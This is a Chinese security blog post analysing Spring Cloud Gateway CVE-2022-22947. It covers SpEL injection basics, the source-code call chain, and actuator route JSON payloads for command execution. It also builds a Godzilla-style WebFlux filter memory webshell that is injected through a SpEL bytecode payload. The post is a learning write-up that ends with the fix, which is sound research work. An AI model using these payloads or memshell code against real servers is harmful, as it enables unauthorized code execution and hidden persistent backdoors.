---
title: "Spring Cloud GateWay CVE-2022-22947构造哥斯拉马"
onlyTitle: true
date: 2023-04-19 13:05:36
categories:
- java
- 框架漏洞
tags:
- CVE
- SPEL表达式注入
- spring CGW
top: true
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B825.png
---

这篇文章的主要目的是学习一下spel表达式注入和哥斯拉内存马注入，还有神器java-object-searcher的使用

# SPEL表达式注入

* spel支持在运行时查询和操作对象图，以API接口的形式创建，所以可以集成到其他应用程序和框架中



### spel接口

* ExpressionParser接口：解析器

> ExpressionParser接口下的parseExpression()方法将字符串表达式转化为Expression对象
>
> * parseExpression()接收参数：
>
> ```java
> Expression parseExpression(String expressionString, ParserContext context);
> ```
>
> 其中parserContext定义了字符串表达式是否为模板，和模板开始与结束字符

我们经常看见的spel表达式以`#{xxx}`的形式出现，他的parserContext如下：

```java
ParserContext parserContext = new ParserContext() {
            @Override
            public boolean isTemplate() {
                return true;
            }
            @Override
            public String getExpressionPrefix() {
                return "#{";
            }
            @Override
            public String getExpressionSuffix() {
                return "}";
            }
        };
```



* EvaluationContext接口：表示上下文环境。以SpelExpression实现，提供getValue和setValue操作对象值



### spel语法

* T(全限定名)表示java.lang.Class，RCE的关键，如下使用`T(java.lang.Runtime)`获取了类，并且可以直接使用类下的方法

```java
T(java.lang.Runtime).getRuntime().exec("calc")
```

* 和java一样的关键字：new进行类实例化，instanceof判断type

```java
new java.lang.ProcessBuilder("calc.exe).start()
```

* 变量定义和引用：
  * 变量定义：`EvaluationContext的setVariable(name,value)`
  * 引用：`#name`，还支持`#this`和`#root`



### spel Controller

pom.xml中添加依赖：

```xml
<dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-expression</artifactId>
    <version>xxx</version>
</dependency>
```

创建一个controller接收字符参数

```java
@Controller
public class spel {
    @RequestMapping("/spel")
    @ResponseBody
    public String spel(String input){
        SpelExpressionParser parser = new SpelExpressionParser();
        Expression expression = parser.parseExpression(input);
        return expression.getValue().toString();
    }
}
```

使用spelExpressionParser接口创建解析器

```java
SpelExpressionParser parser = new SpelExpressionParser();
```

指定ExpressionParser#parseExpression()来解析表达式

```java
Expression expression = parser.parseExpression(input);
```

getValue根据上下文获得表达式

```java
expression.getValue().toString();
```

如果向该Controller HTTP传参，参数名为Input，就能进行spel解析





## spel回显

1. `commons-io`组件回显。但是需要服务器存在该组件，一般都没有

   ```java
   T(org.apache.commons.io.IOUtils).toString(payload).getInputStream())
   ```

   

2. jdk>=9时使用JShell

```java
T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass("jdk.jshell.JShell",true).Methods[6].invoke(null,{}).eval('java payload').toString()
```



3. jdk原生类BufferedReader

```java
new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder( "whoami").start().getInputStream(), "gbk")).readLine()
```

4. scanner

```java
new java.util.Scanner(new java.lang.ProcessBuilder("ls").start().getInputStream(), "GBK").useDelimiter("asfsfsdfsf").next()
```

useDelimiter为分隔符



# Spring Cloud GateWay CVE-2022-22947



## 源码分析

Spring Cloud GateWay版本：3.1.0&<=3.0.0-3.0.6

源码：https://github.com/spring-cloud/spring-cloud-gateway/releases/tag/v3.1.0

idea打开就能分析了

在`shortcutConfigurable#getValue`中，`#{}`包住的进行spel解析，这就是链最后的地方，控制entryValue即可实现spel注入

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230320113908131.png)

在shortcutType处使用了getValue

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230320115246762.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230320115309246.png)

由于是在shortcutType中的normalize中调用的getValue()，所以找也要找调用了`shortcutType().normalize()`方法的类，ConfigurationService就符合

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328160155438.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328162047694.png)

上文的`entry.getValue()`，entry即为第一个参数，也就是一个Map。这里控制`this.properties`为恶意map就能控制spel表达式

在`bind()`方法中触发了`normalizeProperties()`方法：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328162610459.png)

在`RouteDefinitionRouteLocator#lookup()`方法中对properties进行了设置，然后调用了bind()

properties的值为`predicate.getArgs()`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328163322901.png)

在combinePredicates中定义了predicate的值，与routeDefinition有关

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328172604495.png)

在`convertToRoute()`中调用了combinePredicates()

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328172853204.png)

而在路由初始化时触发convertToRoute()

```java
CacheingRouteLocator#onApplicationEvent()->
    CachingRouteLocator#fetch()->
    	CompositeRouteLocator#getRoutes()->
    		RouteDefinitionRouteLocator#getRoutes()->
    			RouteDefinitionRouteLocator#convertToRoute()
```







## 漏洞利用

在官方文档https://docs.spring.io/spring-cloud-gateway/docs/3.1.0/reference/html/#actuator-api中，提供了json发送路由请求内容

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328164518702.png)

Actuator API提供了Rest添加路由的方式:

> 要创建一个路由，请向/gateway/routes/{id_route_to_create}发出一个POST请求，该请求包含一个指定路由字段的JSON主体（见检索某个特定路由的信息）。要删除一个路由，请向/gateway/routes/{id_route_to_delete}发出一个DELETE请求。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328163753075.png)

`http://xxx/actuator/gateway/routes/{xxx}`添加路由

也就是可以向`http://xxx/actuator/gateway/routes/godown`如下payload进行注入

```json
{
  "id": "godown",
  "predicates": [{
    "name": "Path",
    "args": {"_genkey_0":"#{T(java.lang.Runtime).getRuntime().exec('calc')}"}
  }],
  "filters": [],
  "uri": "https://www.uri-destination.org",
  "order": 0
}
```

创建完之后向`http://xxx/actuator/gateway/refresh`发送请求即可刷新

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328165326591.png)





其实添加的这部分路由对应着配置文件中的route部分：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328165708684.png)



注意在创建路由的时候把content-type改为application/json

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230403194802519.png)



## 拓展链

上文payload里的其他参数有没有用？name为什么要是Path？

借用奇安信的一张调用栈图：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328184956808.png)

在RouteDefinitionRouteLocator#convertToRoute()方法处

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328185532235.png)

除了会调用combinePredicates，还会调用getFilters来触发loadGatewayFilters进行bind

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328213727298.png)

所以在filters处注入也是可以的

* 奇安信攻防实验室对各种过滤器进行了实验，事实证明所有过滤器都可以：https://forum.butian.net/share/1410

> 过滤器名称：
>
> ```java
> AddRequestHeader
> MapRequestHeader
> AddRequestParameter
> AddResponseHeader
> ModifyRequestBody
> DedupeResponseHeader
> ModifyResponseBody
> CacheRequestBody
> PrefixPath
> PreserveHostHeader
> RedirectTo
> RemoveRequestHeader
> RemoveRequestParameter
> RemoveResponseHeader
> RewritePath
> Retry
> SetPath
> SecureHeaders
> SetRequestHeader
> SetRequestHostHeader
> SetResponseHeader
> RewriteResponseHeader
> RewriteLocationResponseHeader
> SetStatus
> SaveSession
> StripPrefix
> RequestHeaderToRequestUri
> RequestSize
> RequestHeaderSize
> ```
>
> 

payload:

```json
{
    "id": "first_route",
    "predicates": [],
    "filters": [{
        "name": "Retry",
        "args": 
            {
                "name": "payload",
                "value": "123"
            }
    }],
    "uri": "https://www.uri-destination.org",
    "order": 0
}
```

修改filters.name为任意合法过滤器名，payload处改为spel表达式



同理，predicates里的name，我们之前用的Path

实际上下列predicates都能用：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230329213203262.png)

### 回显

用户定义的路由信息会存在内存中，refresh后会把结果写入路由信息。通过路由信息的API看到RCE的结果（就上面payload注册完路由后GET访问路由路径）

* 利用RedirectTO过滤器注入：

```java
{
    "id": "first_route",
    "predicates": [],
    "filters": [{
        "name": "RedirectTo",
        "args": 
            {
                "status": "302",
                "url": "payload"
            }
    }],
    "uri": "https://www.uri-destination.org",
    "order": 0
}
```

在spring官方文档可以看到RedirectTo接收两个参数，一个status一个url，但是会验证参数类型，也就是说status就必须是枚举类型，url就会进行url解析，所以该过滤器不能使用，没有传入字符串类型的参数，如RemoveRequestHeader，同理对predicates链

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230329213923525.png)





## 注入内存马

spring cloud gateway是基于WebFlux的，关于WebFlux，这篇文章有详尽的说明：

https://juejin.cn/post/7001032584821997598

web服务基于netty和spring，c0ny1佬对针对netty和spring构造了内存马

### netty内存马

netty处理http请求会用pipeline链上的handler依次来处理，内存马就是模拟注册一个handler。但是netty是动态构造pipeline。

动态添加handler的CompositeChannelPipelineConfigurer的compositeChannelPipelineConfigurer第二个参数other默认为空，即默认第一个。如果第二个参数other有值，将被合并为一个新Configurer

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330095907105.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330095949904.png)

使用reactor.netty.transport.TransportConfig#doOnchannelInit来获取Configurer

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330100251980.png)

至于构造netty内存马的代码，已经来到了知识盲区，直接移步https://mp.weixin.qq.com/s/S15erJhHQ4WCVfF0XxDYMg



### 内存马

分析一遍mieea佬的webFilter内存马

spring Webflux是有filter的，在官方文档里有：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330222501934.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330222403239.png)

我们知道filter一般都是一个链，在这里是用DefaultWebFilterChain

在`DefaultWebFilterChain#invokefilter()`处触发filter

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330223055686.png)

可以看到filter()参数只有ServerWebExchange，那模拟就return调用下一个filter构成filter链

一个Filter Demo:

```java
import org.springframework.core.annotation.Order;
import org.springframework.stereotype.Component;
import org.springframework.web.server.ServerWebExchange;
import org.springframework.web.server.WebFilter;
import org.springframework.web.server.WebFilterChain;
import reactor.core.publisher.Mono;

@Component
@Order(value = 2)
public class NormalFilter implements WebFilter{
    @Override
    public Mono<Void> filter(ServerWebExchange exchange, WebFilterChain chain) {
        return chain.filter(exchange);
    }
}
```



反射利用DefaultWebFilterChain#initChain()模拟注册一个filter:

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330225056456.png)

该Chain由FilteringWebHandler生成实例，直接new FilteringWebHandler就能将Filter插入到首位

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330225422742.png)



#### poc构造：

调试环境：https://github.com/Ha0Liu/CVE-2022-22947

使用c0ny1师傅的java-Object-searcher工具（https://github.com/c0ny1/java-object-searcher）找到内存中DefaultWebFilterChain的位置

新建一个NormalFilter，把编译好的java-obejct-searcher-0.1.0.jar导入到target目录下，项目启动后触发一遍filter

```java
import me.gv7.tools.josearcher.entity.Blacklist;
import me.gv7.tools.josearcher.entity.Keyword;
import me.gv7.tools.josearcher.searcher.SearchRequstByBFS;
import org.springframework.core.annotation.Order;
import org.springframework.stereotype.Component;
import org.springframework.web.server.ServerWebExchange;
import org.springframework.web.server.WebFilter;
import org.springframework.web.server.WebFilterChain;
import reactor.core.publisher.Mono;

import java.util.ArrayList;
import java.util.List;

@Component
@Order(value = 2)
public class NormalFilter implements WebFilter {
    @Override
    public Mono<Void> filter(ServerWebExchange exchange, WebFilterChain chain) {
        //设置搜索类型包含Request关键字的对象
        List<Keyword> keys = new ArrayList<>();
        keys.add(new Keyword.Builder().setField_type("chain").build());
        List<Blacklist> blacklists = new ArrayList<>();
        blacklists.add(new Blacklist.Builder().setField_type("java.io.File").build());
        SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys);
        searcher.setBlacklists(blacklists);
        searcher.setIs_debug(true);
        searcher.setMax_search_depth(10);
        searcher.setReport_save_path("xx");
        searcher.searchObject();
        return chain.filter(exchange);
    }
}

```

如下：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230403105648279.png)



于是我们得到内存马构造的流程：

1. 构造恶意filter

哥斯拉里面生成jsp的马

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230403150154035.png)

filter不能影响正常的业务，加一个身份验证的http头：

```java
String authorizationHeader = exchange.getRequest().getHeaders().getFirst(HttpHeaders.AUTHORIZATION);
if(authorizationHeader != null && authorizationHeader.equals(auth)) {......}
```

表单数据用`ServerWebexchange.getFormData()`获取

```java
Mono<MultiValueMap<String, String>> formData = exchange.getFormData();
```

获取到的数据是键值对数据流，用flatMap对数据流进行合并化：

```java
 Mono bufferStream = formData.flatMap(map -> {
                String passStr = map.getFirst(pass);
                StringBuilder result = new StringBuilder();
     			......
 				return Mono.just(new DefaultDataBufferFactory().wrap(result.toString().getBytes(StandardCharsets.UTF_8)));
});
```

为方便移植，把哥斯拉的session换成`Map<String,Object>`

```java
public static Map<String, Object> store = new HashMap<>();
```



2. 从线程中获取到DefaultWebFilterChain:

```java
getThreads = Thread.class.getDeclaredMethod("getThreads");
        getThreads.setAccessible(true);
        Object threads = getThreads.invoke(null);
        for (int i = 0; i < Array.getLength(threads); i++) {
            Object thread = Array.get(threads, i);
            if (thread != null && thread.getClass().getName().contains("NettyWebServer")) {
                // 获取defaultWebFilterChain
                NettyWebServer nettyWebServer = (NettyWebServer) getFieldValue(thread, "this$0",false);
                ReactorHttpHandlerAdapter reactorHttpHandlerAdapter = (ReactorHttpHandlerAdapter) getFieldValue(nettyWebServer, "handler",false);
                Object delayedInitializationHttpHandler = getFieldValue(reactorHttpHandlerAdapter,"httpHandler",false);
                HttpWebHandlerAdapter httpWebHandlerAdapter= (HttpWebHandlerAdapter)getFieldValue(delayedInitializationHttpHandler,"delegate",false);
                ExceptionHandlingWebHandler exceptionHandlingWebHandler= (ExceptionHandlingWebHandler)getFieldValue(httpWebHandlerAdapter,"delegate",true);
                FilteringWebHandler filteringWebHandler = (FilteringWebHandler)getFieldValue(exceptionHandlingWebHandler,"delegate",true);
                DefaultWebFilterChain defaultWebFilterChain= (DefaultWebFilterChain)getFieldValue(filteringWebHandler,"chain",false);
```



3. 将恶意filter插入到Chain中，并指定到首位(0位)

```java
List<WebFilter> newAllFilters= new ArrayList<>(defaultWebFilterChain.getFilters());
newAllFilters.add(0,new FilterMemshellPro());
DefaultWebFilterChain newChain = new DefaultWebFilterChain((WebHandler) handler, newAllFilters);
```

生成filteringWebHandler:

```java
Field f = filteringWebHandler.getClass().getDeclaredField("chain");
....
f.set(filteringWebHandler,newChain);
```



直达github完整poc：https://github.com/mieeA/SpringWebflux-MemShell/



#### spel表达式注入字节码

Memshell改为你的软件包名+shell

```java
#{T(org.springframework.cglib.core.ReflectUtils).defineClass('Memshell',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAA....'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()}
```

> 其中`'yv66vgAAA....'`为Base64Encode的字节码，可通过如下代码生成：
>
> ```java
> import org.springframework.util.Base64Utils;
> 
> import java.io.*;
> import java.nio.charset.StandardCharsets;
> 
> public class EncodeShell {
>     public static void main(String[] args){
>         byte[] data = null;
>         try {
>             InputStream in = new FileInputStream("MemShell.class");
>             data = new byte[in.available()];
>             in.read(data);
>             in.close();
>         } catch (IOException e) {
>             e.printStackTrace();
>         }
>         String shellStr = Base64Utils.encodeToString(data);
>         System.out.println(shellStr);
>         try {
>             OutputStream out = new FileOutputStream("ShellStr.txt");
>             out.write(shellStr.getBytes(StandardCharsets.UTF_8));
>             out.flush();
>             out.close();
>         } catch (IOException e) {
>             e.printStackTrace();
>         }
>     }
> }
> ```
>



![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230403160101623.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230403210809225.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230403211324940.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230403211438387.png)



如果注入过程有问题，可以在docker中看下Log



## 漏洞修复

https://github.com/spring-cloud/spring-cloud-gateway/commit/d8c255eddf4eb5f80ba027329227b0d9e2cd9698

commit的历史中，把StandardEvaluationContext替换为了SimpleEvalutionContext

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328182426298.png)





参考：[](https://blog.csdn.net/ExpLang/article/details/121670490?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167927922816800192224617%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167927922816800192224617&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-121670490-null-null.142^v74^control,201^v4^add_ask,239^v2^insert_chatgpt&utm_term=spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4187)

[](https://www.cnblogs.com/N0r4h/p/15986151.html)

http://wjlshare.com/archives/1748

https://xz.aliyun.com/t/11331

https://forum.butian.net/share/1410

https://mp.weixin.qq.com/s/S15erJhHQ4WCVfF0XxDYMg